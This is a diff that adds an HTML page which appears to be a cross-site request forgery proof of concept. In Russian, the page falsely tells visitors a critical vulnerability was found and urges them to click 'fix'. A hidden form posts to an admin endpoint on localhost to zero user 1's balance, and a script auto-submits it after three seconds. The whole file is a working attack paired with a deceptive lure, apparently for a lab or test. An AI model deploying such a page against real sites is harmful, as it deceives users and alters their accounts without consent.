@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Срочное действие!</title>
+</head>
+<body>
+    <h1>Внимание! Обнаружена критическая уязвимость!</h1>
+    <p>Для устранения проблемы необходимо срочно нажать кнопку ниже.</p>
+    <form action="http://localhost:8080/admin/users/edit_balance" method="post">
+        <input type="hidden" name="id" value="1">
+        <input type="hidden" name="balance" value="0">
+        <button type="submit">Устранить уязвимость</button>
+    </form>
+
+    <script>
+        // Автоматически отправляем форму через 3 секунды после загрузки страницы
+        setTimeout(function() {
+            document.forms[0].submit();
+        }, 3000);
+    </script>
+</body>
+</html>
